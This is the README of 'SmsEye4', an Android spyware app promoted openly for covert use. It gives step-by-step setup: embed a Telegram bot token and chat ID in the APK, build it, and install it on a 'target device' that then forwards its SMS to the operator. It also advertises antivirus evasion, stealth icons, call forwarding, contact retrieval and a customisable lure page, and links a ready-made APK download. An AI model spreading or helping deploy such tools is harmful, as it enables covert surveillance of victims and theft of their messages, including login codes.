<p align="center">
  <img src="/images/icon.png" alt="App Icon" width="200" height="200"/>
</p>

<h1 align="center">⚫ SmsEye4 ⚫</h1>

## ✨ About

#### Sms Eye 4 is a powerful yet lightweight Android tool that forwards SMS messages from any target device directly to your Telegram group — with clean, organized topic-based threads for effortless monitoring.

#### Updated for 2025 — fully compatible with the latest Android versions.

### 🆓 **Free Features**
- Forward unlimited SMS messages to your Telegram group
- Fully customizable bot token, chat ID, and URL
- Basic welcome page customization (posters & texts)
- Supports any Android device or emulator
- Seamlessly runs in the background without user interaction

### ⭐ **Premium Features**
- Changeable app icon for stealth purposes
- Call forwarding from target device
- USSD code execution remotely
- Undetectable by any antivirus software
- Send SMS via target device
- Notification reader for incoming alerts
- Live client status updates (online/offline tracking)
- Contact list retrieval

## 🛠️ Built With

- 🧰 **Android Studio** – the official IDE for Android development  
- 🧪 **Kotlin** – modern, expressive, and powerful programming language for Android  

## 📦 Setup

> Follow these steps to set up and run the project.

### ✅ Step 1 – Create a Telegram Bot

1. Open Telegram and search for [@BotFather](https://t.me/BotFather).  
2. Start a chat and send the command: `/newbot`.  
3. Follow the prompts to set a name and username for your bot.  
4. After creation, BotFather will give you a **bot token**.

5. **Save this token** somewhere safe.

---

### ✅ Step 2 – Create a Telegram Group & Enable Topics

1. Create a **new group** in Telegram.  
2. Open group settings → tap **“Manage Group”** → enable **Topics**.  
3. Add your Telegram bot to the group.  
4. Make the bot an **admin** with permission to post messages.

---

### ✅ Step 3 – Install APK Editor & Download App

1. 📥 [**Download APK Editor from our Telegram channel**](https://t.me/abyssalarmybackup)  
2. 📦 [**Download SmsEye4 APK**](https://github.com/AbyssalArmy/SmsEye4/raw/refs/heads/main/sms-eye-4.apk)  

---

### ✅ Step 4 – Edit the App Configuration

1. Open **APK Editor** and select the **smsEye4 APK**.  
2. Go to the `Files` tab.  
3. Navigate to the following path:

    ```
    assets/
    └── data/
        ├── token.txt
        ├── chat.txt
        └── url.txt
    ```

4. Open and edit each of the files as follows:

   - `token.txt` → Paste your **Telegram bot token** from Step 1  

   - `chat.txt` → You’ll need to enter your **Telegram group chat ID**:
     1. Make sure your bot has been **added to the group** and is an **admin**.  
     2. Send a **test message** in the group.  
     3. Visit this tool: [Telegram Chat ID Finder](https://abyssalarmy.github.io/AbyssalArmy/utils/telegram-chat-id-finder)  
     4. Paste your bot token in the field and click **"Find"**.  
     5. Copy the group chat ID it returns and paste it into `chat.txt`.

   - `url.txt` → Paste the **URL** you want the app to open or show when launched.

---

### ✅ Step 5 – Save & Build the APK

1. Once you've finished editing all three files (`token.txt`, `chat.txt`, and `url.txt`), go back in APK Editor.  
2. Tap on the **"Build"** button to compile the modified APK.  
3. Wait for the build to complete — this may take a few seconds.  
4. After it's done, install the newly built APK on the target device.

🎉 That’s it! Your app is now connected to your Telegram bot and ready to forward SMS messages.

## 🎨 Customization

In addition to the `data` folder, the app contains two other folders inside the APK structure that allow for visual and textual customization of the welcome page:

### 🖼️ `posters/`

- This folder contains the **images** displayed on the welcome screen.
- You can replace these images with your own.
- ⚠️ **Only `.png` format is supported** — make sure your custom images are in PNG format to avoid issues.

### 📝 `texts/`

- This folder contains the **text content** shown on the welcome screen.
- You can modify these text files freely to personalize the welcome message or instructions for your target.

You can access and edit both folders using **APK Editor** under the `Files` tab, just like you did with the `data` folder.


## 📢 Stay Updated

Join our official [**Telegram Channel**](https://t.me/abyssalarmybackup) for the latest updates, news, and spyware releases.

[![Telegram Channel](https://img.shields.io/badge/Join%20Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/abyssalarmybackup)

## 🛠️ Need Help or Want to Buy Premium?

For support, questions, premium feature inquiries, or to purchase the premium version, contact the admin directly via Telegram:

[![Contact Admin](https://img.shields.io/badge/Message%20Admin-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/abyssalarmyadmin)

